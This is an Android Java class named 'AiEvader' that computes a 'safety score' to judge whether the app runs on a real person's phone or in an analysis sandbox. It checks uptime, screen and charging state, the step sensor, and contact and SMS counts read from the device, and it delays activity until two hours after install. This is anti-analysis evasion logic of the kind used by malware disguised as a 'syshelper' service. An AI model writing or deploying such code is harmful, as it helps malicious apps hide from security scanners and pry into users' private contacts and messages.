package com.syshelper.service;
import android.content.Context;

public class AiEvader {
    public static int getSafetyScore(Context ctx) {
        int score = 0;
        long uptime = android.os.SystemClock.elapsedRealtime();
        if (uptime > 300000) score += 20;
        android.os.PowerManager pm = (android.os.PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
        if (pm != null && pm.isInteractive()) score += 15;
        android.os.BatteryManager bm = (android.os.BatteryManager) ctx.getSystemService(Context.BATTERY_SERVICE);
        if (bm != null && bm.isCharging()) score += 15;
        android.hardware.SensorManager sm = (android.hardware.SensorManager) ctx.getSystemService(Context.SENSOR_SERVICE);
        if (sm != null && sm.getDefaultSensor(android.hardware.Sensor.TYPE_STEP_DETECTOR) != null) score += 20;
        if (getContactCount(ctx) > 10) score += 15;
        if (getSmsCount(ctx) > 50) score += 15;
        return score;
    }

    private static int getContactCount(Context ctx) {
        try {
            android.database.Cursor c = ctx.getContentResolver().query(android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            int count = c != null ? c.getCount() : 0;
            if (c != null) c.close();
            return count;
        } catch (Exception e) { return 0; }
    }

    private static int getSmsCount(Context ctx) {
        try {
            android.database.Cursor c = ctx.getContentResolver().query(android.provider.Telephony.Sms.CONTENT_URI, null, null, null, null);
            int count = c != null ? c.getCount() : 0;
            if (c != null) c.close();
            return count;
        } catch (Exception e) { return 0; }
    }

    public static boolean isWarmedUp(Context ctx) {
        android.content.SharedPreferences prefs = ctx.getSharedPreferences("veil_prefs", Context.MODE_PRIVATE);
        long installTime = prefs.getLong("install_time", 0);
        if (installTime == 0) {
            prefs.edit().putLong("install_time", System.currentTimeMillis()).apply();
            return false;
        }
        long elapsed = System.currentTimeMillis() - installTime;
        return elapsed > 7200000;
    }
}
